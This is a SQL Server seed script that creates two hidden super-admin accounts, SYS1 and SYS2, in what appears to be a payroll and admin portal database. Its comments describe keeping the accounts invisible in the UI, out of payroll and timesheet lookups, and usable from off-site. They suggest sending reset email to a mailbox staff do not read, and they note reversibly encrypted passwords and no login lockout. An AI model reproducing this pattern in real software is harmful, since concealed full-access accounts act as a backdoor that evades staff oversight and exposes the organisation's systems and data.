SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

/*
    2026-08-01  Hidden super admin accounts - seed SYS1 and SYS2

    Creates two employee accounts that can log into the Admin portal with full
    access and appear nowhere in the UI.

    Per account: Payee -> Employee -> SystemUser.

    Requires Payee_AddIsSystemAccount.sql to have been deployed first.

    Plan:     plan/hidden-super-admin-accounts-v2.md
    Rollback: SystemAccounts_Seed_rollback.sql

    ------------------------------------------------------------------
    BEFORE RUNNING - replace the two ciphertext placeholders below.
    ------------------------------------------------------------------
    PasswordHash must be produced by KLS.Common.Utilities.Encrypt, which SQL
    cannot reproduce. Generate each one with:

        Console.WriteLine(KLS.Common.Utilities.Encrypt("<the password>"));

    Encrypt uses a fresh salt and IV per call, so the same password yields
    different ciphertext each run. Any of them decrypt correctly.

    NOTE (plan D7): Utilities.Encrypt is symmetric and its key is a constant
    compiled into KLS.Common, so this ciphertext is equivalent to the plaintext
    for anyone who can read the repository. Do NOT commit this file with real
    values in place. There is also no lockout on login - use long random
    passwords.
    ------------------------------------------------------------------
*/

DECLARE @Sys1PasswordHash NVARCHAR(255) = N'<<<PASTE CIPHERTEXT FOR SYS1>>>';
DECLARE @Sys2PasswordHash NVARCHAR(255) = N'<<<PASTE CIPHERTEXT FOR SYS2>>>';

-- Email is optional (plan D6). Leave NULL to disable self-service password
-- reset, or set a monitored mailbox that staff do not read.
DECLARE @Sys1Email NVARCHAR(200) = NULL;
DECLARE @Sys2Email NVARCHAR(200) = NULL;

DECLARE @Sys1PayeeId INT = 100195;
DECLARE @Sys2PayeeId INT = 100196;
DECLARE @AdminRoleId INT = 1;          -- SystemRole 'Admin', IsAdmin = 1

SET XACT_ABORT ON;
BEGIN TRAN;
BEGIN TRY

    ----------------------------------------------------------------------
    -- Preconditions
    ----------------------------------------------------------------------
    IF NOT EXISTS (SELECT 1 FROM sys.columns
                   WHERE object_id = OBJECT_ID('dbo.Payee') AND name = 'IsSystemAccount')
        THROW 51010, 'Payee.IsSystemAccount does not exist. Deploy Payee_AddIsSystemAccount.sql first.', 1;

    IF @Sys1PasswordHash LIKE '%PASTE CIPHERTEXT%' OR @Sys2PasswordHash LIKE '%PASTE CIPHERTEXT%'
        THROW 51011, 'Password ciphertext placeholders have not been replaced.', 1;

    -- The chosen ids must still be the next two sequential employee ids.
    -- GetMaxEmployeeId() in EmployeeService is MAX(Employee.PayeeId) + 1, so if
    -- someone added an employee since this file was written, using 100195/100196
    -- would collide or leave a gap.
    DECLARE @MaxEmpPayeeId INT = (SELECT MAX(PayeeId) FROM dbo.Employee);

    IF @MaxEmpPayeeId <> @Sys1PayeeId - 1
        THROW 51012, 'MAX(Employee.PayeeId) is not 100194 any more. Re-derive the two ids before seeding.', 1;

    IF EXISTS (SELECT 1 FROM dbo.Payee WHERE PayeeId IN (@Sys1PayeeId, @Sys2PayeeId))
        THROW 51013, 'PayeeId 100195 or 100196 is already in use.', 1;

    IF EXISTS (SELECT 1 FROM dbo.Payee WHERE PayeeName IN (N'SYS1', N'SYS2'))
        THROW 51014, 'PayeeName SYS1 or SYS2 is already in use.', 1;

    IF EXISTS (SELECT 1 FROM dbo.SystemUser WHERE Username IN (N'SYS1', N'SYS2'))
        THROW 51015, 'Username SYS1 or SYS2 is already in use.', 1;

    IF NOT EXISTS (SELECT 1 FROM dbo.SystemRole WHERE SystemRoleId = @AdminRoleId AND IsAdmin = 1)
        THROW 51016, 'SystemRoleId 1 is not an admin role.', 1;

    ----------------------------------------------------------------------
    -- Payee
    ----------------------------------------------------------------------
    -- Payee.Id is IDENTITY and must not be supplied. PayeeId is not (the model
    -- maps it ValueGeneratedNever), so it is set explicitly.
    INSERT INTO dbo.Payee (PayeeId, PayeeName, PayeeType, IsClosed, IsSystemAccount)
    VALUES (@Sys1PayeeId, N'SYS1', 'E', 0, 1),
           (@Sys2PayeeId, N'SYS2', 'E', 0, 1);

    ----------------------------------------------------------------------
    -- Employee
    ----------------------------------------------------------------------
    -- Rate / PayFrequency / EmploymentType are deliberately empty. Payroll_InjectEmp
    -- filters on "Rate > 0 AND EmploymentType = 'W2' AND PayFrequency = @PayOption"
    -- and does NOT read IsSystemAccount, so these three values are the only thing
    -- keeping SYS1/SYS2 out of a payroll run. Do not give these accounts a rate.
    --
    -- SSN NULL keeps them unreachable from the Timesheet portal, which finds
    -- employees by SSN suffix.
    --
    -- HasOutsideAccess = 0 is required for off-site login: when it is 1,
    -- LoginEmployee restricts the account to the SYS_IPADDRESS office IP.
    INSERT INTO dbo.Employee
        (PayeeId, FirstName, LastName, Department,
         EmploymentType, SSN, Rate, PayFrequency,
         IsUsePayCheck, HasOutsideAccess, HasPastDueWarning, IsPriceChangeNotify, IsService)
    VALUES
        (@Sys1PayeeId, N'SYS1', N'SYS1', N'Office',
         NULL, NULL, 0, NULL,
         0, 0, 0, 0, 0),
        (@Sys2PayeeId, N'SYS2', N'SYS2', N'Office',
         NULL, NULL, 0, NULL,
         0, 0, 0, 0, 0);

    ----------------------------------------------------------------------
    -- SystemUser
    ----------------------------------------------------------------------
    INSERT INTO dbo.SystemUser
        (PayeeId, SystemRoleId, Username, Email, PasswordHash, Inactive, CreatedAt)
    VALUES
        (@Sys1PayeeId, @AdminRoleId, N'SYS1', @Sys1Email, @Sys1PasswordHash, 0, GETUTCDATE()),
        (@Sys2PayeeId, @AdminRoleId, N'SYS2', @Sys2Email, @Sys2PasswordHash, 0, GETUTCDATE());

    COMMIT TRAN;
END TRY
BEGIN CATCH
    IF @@TRANCOUNT > 0 ROLLBACK TRAN;
    THROW;
END CATCH
GO

-- Verify
SELECT p.PayeeId, p.PayeeName, p.PayeeType, p.IsSystemAccount, p.IsClosed,
       e.Department, e.Rate, e.PayFrequency, e.HasOutsideAccess,
       u.Username, u.SystemRoleId, u.Inactive,
       CASE WHEN u.Email IS NULL THEN 'no email' ELSE 'email set' END AS EmailState
FROM dbo.Payee p
INNER JOIN dbo.Employee e   ON e.PayeeId = p.PayeeId
INNER JOIN dbo.SystemUser u ON u.PayeeId = p.PayeeId
WHERE p.IsSystemAccount = 1;
GO
